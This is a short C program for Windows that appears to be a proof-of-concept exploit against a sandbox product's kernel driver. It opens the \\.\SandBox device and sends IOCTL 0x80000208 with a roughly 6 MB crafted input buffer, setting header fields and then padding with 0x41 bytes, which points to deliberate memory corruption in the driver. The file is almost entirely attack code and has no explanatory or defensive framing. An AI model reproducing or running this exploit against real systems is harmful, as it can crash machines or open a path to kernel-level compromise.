#include <Windows.h>
#define SIZE 0x600000
typedef struct Argos{
	HANDLE handle;
	DWORD code;
	BYTE * buffer; 
	DWORD len;
} ARGOS;

DWORD WINAPI ioctlreq(VOID * args)
{	
	BYTE outbuffer[0x200];
	DWORD dwErrCode;		
	DeviceIoControl(((ARGOS*)args)->handle, ((ARGOS*)args)->code, ((ARGOS*)args)->buffer, ((ARGOS*)args)->len, outbuffer, sizeof(outbuffer), &dwErrCode, 0);			
	return 0;
}

int main(int argc, char ** argv)
{
	HANDLE handle = INVALID_HANDLE_VALUE;
	handle = CreateFileA("\\\\.\\SandBox", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		NULL, OPEN_EXISTING,  FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 0);
	if (handle == INVALID_HANDLE_VALUE)
		return -1;
	else
	{
		
		DWORD len = SIZE + 0x1F;
		BYTE* inbuffer = (BYTE *) VirtualAlloc(NULL, len, MEM_COMMIT, 0x40);
		ZeroMemory(inbuffer, len);
		*(DWORD*)(inbuffer) = 0x1024;
		*(DWORD*)(inbuffer+0x4) = 0x4d;
		*(DWORD*)(inbuffer+0x10) = len;
		*(DWORD*)(inbuffer+0x14) = 0x0000BEEB;
		*(WORD*)(inbuffer+0x18) = 0x1;
		*(BYTE*)(inbuffer+0x1A) = 0x1;
		*(DWORD*)(inbuffer+0x1B) = 0x80300000;
		for(int i = 0 ; i < SIZE; i++)
		{
			*(BYTE*)(inbuffer+0x1F+i) = 0x41;
		}		
		ARGOS * args = new ARGOS();
		args->buffer = inbuffer;
		args->handle = handle;
		args->len = len;
		args->code = 0x80000208;
		ioctlreq(args);
		free(args);
		CloseHandle(handle);	
	}																												
}
